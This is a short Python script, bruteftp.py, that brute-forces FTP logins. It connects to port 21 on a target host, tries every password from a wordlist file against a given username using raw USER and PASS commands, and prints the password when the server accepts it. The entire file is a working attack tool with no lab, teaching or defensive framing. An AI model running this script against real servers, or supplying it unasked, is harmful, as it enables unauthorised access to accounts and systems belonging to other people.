#!/usr/bin/env python

import socket,sys,re

if len(sys.argv) != 3:
  print("How to Use: python bruteftp.py 127.0.0.1 username")
  sys.exit(1)

target = sys.argv[1]
username = str(sys.argv[2]).strip()

f = open('wordlists.txt')
for password in f.readlines():
  print("Starting the Brute Force Attack: {}|{}".format(username,password))

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target,21))
  s.recv(1024)
  user = "USER " + username + "\r\n"
  s.send(user.encode())
  s.recv(1024)
  password = "PASS " + password +  "\r\n"
  s.send(password.encode())
  answer = s.recv(1024)
  close = "QUIT\r\n"
  s.send(close.encode())

  if re.search("230", answer.decode()):
    print("[+] Password Found: " + password)
    sys.exit(1)
  else:
    print("Access Denied!!!")